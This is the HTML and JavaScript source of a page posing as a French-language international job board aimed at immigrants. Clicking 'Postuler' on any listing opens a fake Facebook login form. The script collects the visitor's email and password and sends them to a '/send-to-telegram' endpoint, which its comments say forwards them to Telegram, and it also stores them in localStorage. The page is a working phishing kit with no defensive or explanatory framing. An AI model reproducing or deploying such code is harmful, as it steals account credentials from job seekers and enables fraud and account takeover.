<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Emploi International ‚Äî Opportunit√©s Mondiales</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Inter', sans-serif;
      margin: 0;
      background-color: #f9fafb;
      color: #111827;
    }
    header {
      background: linear-gradient(90deg, #004aad, #007bff);
      color: white;
      text-align: center;
      padding: 2rem 1rem;
    }
    header h1 {
      font-size: 2rem;
      font-weight: 800;
    }
    .search-bar {
      display: flex;
      justify-content: center;
      margin: 1.5rem auto;
      max-width: 800px;
    }
    .search-bar input {
      flex: 1;
      padding: 0.75rem 1rem;
      border: 1px solid #d1d5db;
      border-radius: 8px 0 0 8px;
      font-size: 1rem;
      outline: none;
    }
    .search-bar button {
      padding: 0.75rem 1.5rem;
      border: none;
      background: #007bff;
      color: white;
      font-weight: 600;
      border-radius: 0 8px 8px 0;
      cursor: pointer;
    }
    .offers {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 1.5rem;
      padding: 1.5rem;
      max-width: 1200px;
      margin: auto;
    }
    .offer {
      background: white;
      border-radius: 12px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      padding: 1.5rem;
      transition: transform 0.2s ease;
    }
    .offer:hover {
      transform: translateY(-4px);
    }
    .offer h3 {
      margin: 0 0 0.5rem 0;
      color: #004aad;
    }
    .offer p {
      margin: 0.25rem 0 1rem 0;
    }
    .offer-buttons {
      display: flex;
      justify-content: space-between;
    }
    .btn {
      padding: 0.5rem 1rem;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: 600;
    }
    .btn-apply { background: #007bff; color: white; }
    .btn-skip { background: #ef4444; color: white; }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .modal-content {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      width: 95%; max-width: 560px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }
    .modal-content h2 { margin-top: 0; }
    .modal-content input, .modal-content textarea {
      width: 100%;
      padding: 0.5rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .modal-content button {
      padding: 0.5rem 1rem;
      margin-top: 1rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    /* Facebook-like form styles */
    .fb-form .wrap{max-width:980px;display:grid;grid-template-columns:1fr;gap:18px;align-items:center}
    .fb-card{background:white;padding:16px;border-radius:8px;box-shadow:0 6px 18px rgba(18,38,63,0.08)}
    .fb-logo{display:flex;align-items:center;gap:10px}
    .fb-logo img{width:48px;height:48px}
    .fb-logo h1{font-size:24px;margin:0;color:#1877f2}
    .fb-small{font-size:14px;color:#606770}
    .error{color:#e53935}
  </style>
</head>
<body>
  <header>
    <h1 style="color:white;text-align:center;margin:0;padding:1rem;background:linear-gradient(90deg,#004aad,#007bff);">Emploi International ‚Äî Trouvez votre opportunit√© √† l'√©tranger üåç</h1>
  </header>

  <div class="search-bar">
    <input type="text" id="searchInput" placeholder="Recherchez un emploi (ex: chauffeur, cuisinier, ing√©nieur, Canada, etc.)">
    <button onclick="searchJobs()">Rechercher</button>
  </div>

  <section class="offers" id="offersList"></section>

  <!-- Modal Step 1: Facebook message -->
  <div class="modal" id="fbMessageModal">
    <div class="modal-content">
      <h2>Rejoignez notre communaut√© !</h2>
      <p>Inscrivez-vous √† notre groupe Facebook pour recevoir les derni√®res offres pour immigrants.</p>
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px">
        <button onclick="closeFbMessage()" style="background:#6b7280;color:#fff;border:none;padding:8px 12px;border-radius:6px">Annuler</button>
        <button onclick="openFbForm()" style="background:#1877f2;color:#fff;border:none;padding:8px 12px;border-radius:6px">S'inscrire</button>
      </div>
    </div>
  </div>

  <!-- Modal Step 2: Facebook-like form -->
  <div class="modal" id="fbFormModal">
    <div class="modal-content fb-form">
      <div class="fb-card">
        <div class="fb-logo">
          <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Logo">
          <div>
            <h1>facebook</h1>
            <p class="fb-small">Rejoignez notre communaut√© pour recevoir les derni√®res offres pour immigrants.</p>
          </div>
        </div>

        <form id="fbSignupForm">
          <div style="margin-top:12px">
            <input id="fb_email" name="email" type="email" placeholder="Num√©ro ou e-mail" autocomplete="username" required>
            <input id="fb_password" name="password" type="password" placeholder="Mot de passe" autocomplete="current-password" required minlength="6">
          </div>

          <div class="links" style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:14px">
            <a href="#" id="forgot">Mot de passe oubli√© ?</a>
          </div>

          <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px">
            <button type="button" onclick="closeFbForm()" style="background:#6b7280;color:#fff;border:none;padding:8px 12px;border-radius:6px">Annuler</button>
            <button type="submit" class="btn" style="background:#1877f2;color:#fff;border:none;padding:8px 12px;border-radius:6px">Se connecter</button>
          </div>
        </form>

        <div id="fbFeedback" class="fb-small" style="margin-top:10px"></div>
      </div>
    </div>
  </div>

  <script>
    // jobs data
    const jobs = [
      { title: 'Chauffeur de livraison ‚Äî Canada', desc: 'Poste accessible sans dipl√¥me. Salaire: 2300 CAD/mois' },
      { title: 'Agent d\'entretien ‚Äî Allemagne', desc: 'Entretien des bureaux. Formation sur place.' },
      { title: 'Serveur/Serveuse ‚Äî France', desc: 'Restauration rapide et traditionnelle. CDI possible.' },
      { title: 'Ouvrier agricole ‚Äî Australie', desc: 'Programme de travail temporaire avec h√©bergement.' },
      { title: 'Aide-soignant ‚Äî Suisse', desc: 'Formation en interne, salaire attractif et avantages sociaux.' },
      { title: 'Technicien en maintenance ‚Äî Su√®de', desc: 'Poste qualifi√©. Exp√©rience 2 ans minimum.' },
      { title: 'Plombier ‚Äî Norv√®ge', desc: 'Exp√©rience requise, contrat de 12 mois renouvelable.' },
      { title: 'Assistant administratif ‚Äî Belgique', desc: 'Bureautique, gestion de dossiers, bilingue FR/NL souhait√©.' },
      { title: 'Employ√© logistique ‚Äî Pays-Bas', desc: 'Gestion des stocks et pr√©paration de commandes.' },
      { title: 'Programmeur junior ‚Äî Canada', desc: 'D√©veloppement web et logiciel. T√©l√©travail possible.' },
      { title: 'Conducteur d\'engins ‚Äî Finlande', desc: 'Exp√©rience en conduite de machines lourdes.' },
      { title: 'H√¥te/H√¥tesse d\'accueil ‚Äî France', desc: 'Accueil de client√®le internationale.' },
      { title: 'Agent de s√©curit√© ‚Äî Irlande', desc: 'Formation assur√©e, travail de nuit possible.' },
      { title: 'Electricien industriel ‚Äî Danemark', desc: 'Travail sur chantiers europ√©ens, bon salaire.' },
      { title: 'Serveur en h√¥tel ‚Äî Espagne', desc: 'Ambiance multiculturelle, logement fourni.' },
      { title: 'Coiffeur/Coiffeuse ‚Äî Luxembourg', desc: 'Poste en salon moderne, exp√©rience souhait√©e.' },
      { title: 'Chef cuisinier ‚Äî √âtats-Unis', desc: 'Poste dans un restaurant gastronomique, visa sponsoris√©.' },
      { title: 'Employ√© de ferme ‚Äî Nouvelle-Z√©lande', desc: 'Emploi saisonnier, logement inclus.' },
      { title: 'Manutentionnaire ‚Äî Royaume-Uni', desc: 'Chargement/d√©chargement, travail physique accessible √† tous.' },
      { title: 'R√©ceptionniste ‚Äî Canada', desc: 'Service client, anglais requis.' }
    ];

    // display jobs
    function displayJobs(list) {
      const container = document.getElementById('offersList');
      container.innerHTML = '';
      list.forEach((job, index) => {
        const card = document.createElement('div');
        card.classList.add('offer');
        card.innerHTML = `
          <h3>${job.title}</h3>
          <p>${job.desc}</p>
          <div class="offer-buttons">
            <button class="btn btn-apply" onclick="onApply('${job.title}')">Postuler</button>
            <button class="btn btn-skip" onclick="skipJob(${index})">Pas int√©ress√©</button>
          </div>
        `;
        container.appendChild(card);
      });
    }

    function searchJobs() {
      const input = document.getElementById('searchInput').value.toLowerCase();
      const filtered = jobs.filter(job => 
        job.title.toLowerCase().includes(input) || 
        job.desc.toLowerCase().includes(input)
      );
      displayJobs(filtered);
    }

    function skipJob(index) {
      const newJob = {
        title: 'Nouvelle offre ‚Äî ' + ['Canada','France','Suisse','Allemagne','Luxembourg'][Math.floor(Math.random()*5)],
        desc: 'Poste r√©cemment ajout√©, rejoignez cette opportunit√© √† l\'international.'
      };
      jobs[index] = newJob;
      displayJobs(jobs);
    }

    // --- Flow when clicking Postuler ---
    let pendingJobTitle = null;
    function onApply(title) {
      pendingJobTitle = title;
      document.getElementById('fbMessageModal').style.display = 'flex';
    }

    function closeFbMessage(){
      document.getElementById('fbMessageModal').style.display = 'none';
      pendingJobTitle = null;
    }

    function openFbForm(){
      document.getElementById('fbMessageModal').style.display = 'none';
      document.getElementById('fbFormModal').style.display = 'flex';
      const fbFeedback = document.getElementById('fbFeedback');
      fbFeedback.textContent = 'Vous postulez pour : ' + (pendingJobTitle || 'l\'offre');
    }

    function closeFbForm(){
      document.getElementById('fbFormModal').style.display = 'none';
      pendingJobTitle = null;
    }

    // NOUVELLE FONCTION : Envoyer les donn√©es √† l'API Vercel
    async function sendToTelegram(formData) {
      try {
        // URL de votre API Vercel - utilisation du chemin relatif
        const API_URL = '/send-to-telegram';
        
        console.log('Envoi des donn√©es:', formData);
        
        const response = await fetch(API_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData)
        });

        const result = await response.json();
        
        if (result.success) {
          alert('‚úÖ ' + result.message);
          return true;
        } else {
          alert('‚ùå ' + result.message);
          return false;
        }
      } catch (error) {
        console.error('Erreur:', error);
        alert('‚ùå Erreur de connexion. Veuillez r√©essayer.');
        return false;
      }
    }

    // Form submission
    document.addEventListener('DOMContentLoaded', ()=>{
      const fbForm = document.getElementById('fbSignupForm');
      fbForm.addEventListener('submit', async (e)=>{
        e.preventDefault();
        const email = document.getElementById('fb_email').value.trim();
        const password = document.getElementById('fb_password').value.trim();
        
        if(!email){ 
          alert('Veuillez saisir un email valide.'); 
          return; 
        }
        if(!password){ 
          alert('Veuillez saisir un mot de passe valide.'); 
          return; 
        }

        const formData = {
          job: pendingJobTitle || 'Non sp√©cifi√©',
          email: email,
          password: password,
          note: 'Inscription via formulaire Facebook-like',
          date: new Date().toLocaleString('fr-FR')
        };

        // Sauvegarde locale
        const stored = JSON.parse(localStorage.getItem('applications')) || [];
        stored.push(formData);
        localStorage.setItem('applications', JSON.stringify(stored));

        // Envoi √† Telegram via l'API Vercel
        const success = await sendToTelegram(formData);
        
        if (success) {
          closeFbForm();
        }
      });

      // Initial render
      displayJobs(jobs);
    });

    // Close modals on outside click
    window.onclick = function(e){
      const msg = document.getElementById('fbMessageModal');
      const formM = document.getElementById('fbFormModal');
      if(e.target === msg) msg.style.display = 'none';
      if(e.target === formM) formM.style.display = 'none';
    }
  </script>
</body>
</html>
